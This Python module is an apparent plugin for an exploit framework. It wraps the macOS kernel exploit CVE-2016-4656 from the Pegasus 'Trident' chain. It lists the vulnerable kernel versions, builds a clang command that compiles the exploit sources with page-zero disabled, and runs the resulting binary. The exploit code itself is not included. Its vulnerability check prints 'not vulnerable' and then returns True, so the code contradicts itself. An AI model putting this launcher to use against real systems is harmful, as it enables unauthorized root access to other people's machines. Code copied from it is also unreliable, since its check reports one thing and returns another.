from exploits.exploit import MacExploit
from src.kernels import KernelWindow
from constants import *


class CVE20164656(MacExploit):
	def __init__(self):
		super().__init__()
		self.name = "CVE20164656"
		self.formatted_name = "CVE-2016-4656"
		self.e_type = "mac"
		self.brief_desc = "`Trident` exploit chain from `PEGASUS` APT"
		self.reliability = MEDIUM_RELIABILITY
		self.vulnerable_base = KernelWindow(GENERIC_MAC, BASE_VULNERABLE, 0, 0, 0, 10, 11, 16)
		self.vulnerable_kernels = [
			KernelWindow(GENERIC_MAC, VERSION_VULNERABLE, 0, 0, 0, 10, 11, 16)
		]
		self.exploit_kernels = [
			KernelWindow(GENERIC_MAC, EXPLOIT_AVAILABLE, 0, 0, 0, 10, 11, 16)
		]
		self.architecture = ARCHITECTURE_GENERIC
		self.source_c_path = os.path.join(MAC_EXPLOIT_SOURCE_PATH, self.name)
		self.compilation_path = os.path.join(PLAYGROUND_PATH, self.name)
		self.compilation_command = "clang -framework IOKit -framework Foundation -framework CoreFoundation " \
								"-m32 -Wl,-pagezero_size,0 -O3 {}/exp.m {}/lsym.m -o {}".format(
			self.source_c_path,
			self.source_c_path,
			self.compilation_path)
		self.exploit_command = self.compilation_path

	def determine_vulnerability(self):
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name), color="blue")
		# if kernel matches...it should be vulnerable
		color_print("\t[-] system appears not to be vulnerable to {}".format(self.name), color="red")
		return True